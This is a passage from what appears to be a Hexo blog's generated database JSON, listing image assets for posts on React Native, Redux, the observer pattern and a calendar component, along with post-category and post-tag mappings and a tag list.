151248022.png","post":"ckclr4u250000qrwtdxh4szlf","modified":0,"renderable":0},{"_id":"source/_posts/RN基础入门/image-20200326151335084.png","slug":"image-20200326151335084.png","post":"ckclr4u250000qrwtdxh4szlf","modified":0,"renderable":0},{"_id":"source/_posts/RN基础入门/image-20200326154915534.png","slug":"image-20200326154915534.png","post":"ckclr4u250000qrwtdxh4szlf","modified":0,"renderable":0},{"_id":"source/_posts/RN基础入门/image-20200326155234896.png","slug":"image-20200326155234896.png","post":"ckclr4u250000qrwtdxh4szlf","modified":0,"renderable":0},{"_id":"source/_posts/RN基础入门/image-20200326155524158.png","slug":"image-20200326155524158.png","post":"ckclr4u250000qrwtdxh4szlf","modified":0,"renderable":0},{"_id":"source/_posts/RN基础入门/image-20200326160914205.png","slug":"image-20200326160914205.png","post":"ckclr4u250000qrwtdxh4szlf","modified":0,"renderable":0},{"_id":"source/_posts/RN基础入门/image-20200327083821128.png","slug":"image-20200327083821128.png","post":"ckclr4u250000qrwtdxh4szlf","modified":0,"renderable":0},{"_id":"source/_posts/RN基础入门/image-20200327084507790.png","slug":"image-20200327084507790.png","post":"ckclr4u250000qrwtdxh4szlf","modified":0,"renderable":0},{"_id":"source/_posts/RN基础入门/image-20200327085101363.png","slug":"image-20200327085101363.png","post":"ckclr4u250000qrwtdxh4szlf","modified":0,"renderable":0},{"_id":"source/_posts/RN基础入门/image-20200331154557560.png","slug":"image-20200331154557560.png","post":"ckclr4u250000qrwtdxh4szlf","modified":0,"renderable":0},{"_id":"source/_posts/RN基础入门/image-20200331154722643.png","slug":"image-20200331154722643.png","post":"ckclr4u250000qrwtdxh4szlf","modified":0,"renderable":0},{"_id":"source/_posts/RN基础入门/image-20200331155044160.png","slug":"image-20200331155044160.png","post":"ckclr4u250000qrwtdxh4szlf","modified":0,"renderable":0},{"_id":"source/_posts/RN基础入门/movielist.gif","slug":"movielist.gif","post":"ckclr4u250000qrwtdxh4szlf","modified":0,"renderable":0},{"_id":"source/_posts/观察者模式/观察者模式.png","slug":"观察者模式.png","post":"ckclr4u5v0013qrwtlomxach5","modified":0,"renderable":0},{"_id":"source/_posts/redux/react-redux.png","slug":"react-redux.png","post":"ckclr4u5m000uqrwtgypbanqp","modified":0,"renderable":0},{"_id":"source/_posts/redux/react-redux耦合.gif","slug":"react-redux耦合.gif","post":"ckclr4u5m000uqrwtgypbanqp","modified":0,"renderable":0},{"_id":"source/_posts/封装日历组件/1559829814808.png","slug":"1559829814808.png","post":"ckclr4u5u0010qrwtf7d6s88i","modified":0,"renderable":0},{"_id":"source/_posts/封装日历组件/1559832421561.png","slug":"1559832421561.png","post":"ckclr4u5u0010qrwtf7d6s88i","modified":0,"renderable":0},{"_id":"source/_posts/封装日历组件/2019-06-06_22-54-19.png","slug":"2019-06-06_22-54-19.png","post":"ckclr4u5u0010qrwtf7d6s88i","modified":0,"renderable":0},{"_id":"source/_posts/封装日历组件/20190606223710.png","slug":"20190606223710.png","post":"ckclr4u5u0010qrwtf7d6s88i","modified":0,"renderable":0},{"_id":"source/_posts/封装日历组件/calendar.gif","slug":"calendar.gif","post":"ckclr4u5u0010qrwtf7d6s88i","modified":0,"renderable":0}],"PostCategory":[{"post_id":"ckclr4u250000qrwtdxh4szlf","category_id":"ckclr4u2h0002qrwts94swbul","_id":"ckclr4u3c000bqrwt05cq5uqq"},{"post_id":"ckclr4u2d0001qrwt23zvu2rx","category_id":"ckclr4u370007qrwtygzw0rth","_id":"ckclr4u3f000fqrwtnasznc24"},{"post_id":"ckclr4u2k0004qrwt93x2s3ao","category_id":"ckclr4u3e000cqrwt17hp8eg2","_id":"ckclr4u3h000jqrwt6q3gt98f"},{"post_id":"ckclr4u2r0005qrwtlb74a49x","category_id":"ckclr4u3g000gqrwto3m62eyx","_id":"ckclr4u3m000oqrwtcoy565nc"},{"post_id":"ckclr4u350006qrwtv7tt9ysr","category_id":"ckclr4u3g000gqrwto3m62eyx","_id":"ckclr4u3n000rqrwtvfk9cv28"},{"post_id":"ckclr4u5r000wqrwttchy73n3","category_id":"ckclr4u3g000gqrwto3m62eyx","_id":"ckclr4u5x0014qrwtn9gz3qtc"},{"post_id":"ckclr4u5m000uqrwtgypbanqp","category_id":"ckclr4u5t000yqrwtxjaymcxn","_id":"ckclr4u600018qrwt2yt58jf4"},{"post_id":"ckclr4u5u0010qrwtf7d6s88i","category_id":"ckclr4u5x0015qrwtz74ukw6e","_id":"ckclr4u62001cqrwtj1swd16c"},{"post_id":"ckclr4u5v0013qrwtlomxach5","category_id":"ckclr4u610019qrwtvwuccwxe","_id":"ckclr4u62001eqrwtktzrjndv"},{"post_id":"ckclr7ht600001twtj05nmr1w","category_id":"ckclr4u3m000nqrwt2bdkpjs4","_id":"ckclr7hu000041twtpllq2k72"},{"post_id":"ckclr7htu00011twtjr7k29g7","category_id":"ckclr4u3m000nqrwt2bdkpjs4","_id":"ckclr7hu100051twtntwzpx5g"}],"PostTag":[{"post_id":"ckclr4u250000qrwtdxh4szlf","tag_id":"ckclr4u2j0003qrwtdm8ugt0a","_id":"ckclr4u380009qrwtvj7rru62"},{"post_id":"ckclr4u2d0001qrwt23zvu2rx","tag_id":"ckclr4u370008qrwtv84awv5q","_id":"ckclr4u3f000eqrwtb6fogj9p"},{"post_id":"ckclr4u2k0004qrwt93x2s3ao","tag_id":"ckclr4u3e000dqrwtxhetkpic","_id":"ckclr4u3g000iqrwt2ktys2nb"},{"post_id":"ckclr4u2r0005qrwtlb74a49x","tag_id":"ckclr4u3g000hqrwt0o9f1c3r","_id":"ckclr4u3k000mqrwtb8sd4ytc"},{"post_id":"ckclr4u350006qrwtv7tt9ysr","tag_id":"ckclr4u3g000hqrwt0o9f1c3r","_id":"ckclr4u3n000qqrwtmj4x6v2i"},{"post_id":"ckclr4u5r000wqrwttchy73n3","tag_id":"ckclr4u3g000hqrwt0o9f1c3r","_id":"ckclr4u5v0012qrwtjerwu11s"},{"post_id":"ckclr4u5m000uqrwtgypbanqp","tag_id":"ckclr4u5t000zqrwt8o27xs5h","_id":"ckclr4u5z0017qrwt4gsq8gwl"},{"post_id":"ckclr4u5u0010qrwtf7d6s88i","tag_id":"ckclr4u5x0016qrwtmdrrtjwl","_id":"ckclr4u61001bqrwtrx7nnwyu"},{"post_id":"ckclr4u5v0013qrwtlomxach5","tag_id":"ckclr4u61001aqrwtta0wisso","_id":"ckclr4u62001dqrwt1htnoxiz"},{"post_id":"ckclr7ht600001twtj05nmr1w","tag_id":"ckclr4u3m000pqrwt0otqlij0","_id":"ckclr7hty00021twth1r1ar52"},{"post_id":"ckclr7htu00011twtjr7k29g7","tag_id":"ckclr4u3m000pqrwt0otqlij0","_id":"ckclr7htz00031twt3aod4l6w"}],"Tag":[{"name":"ReactNative","_id":"ckclr4u2j0003qrwtdm8ugt0a"},{"name":"SCSS","_id":"ckclr4u370008qrwtv84awv5q"},{"name":"微信小程序","_id":"ckclr4u3e000dqrwtxhetkpic"},{"name":"JavasCript","_id":"ckclr4u3g000hqrwt0o9f1c3r"},{"name":"MongoDB","_id":"ckclr4u3m000pqrwt0otqlij0"},{"name":"reactjs","_id":"ckclr4u5t000zqrwt8o27xs5h"},{"name":"vue.js","_id":"ckclr4u5x0016qrwtmdrrtjwl"},{"name":"设计模式","_id":"ckclr4u61001aqrwtta0wisso"}]}}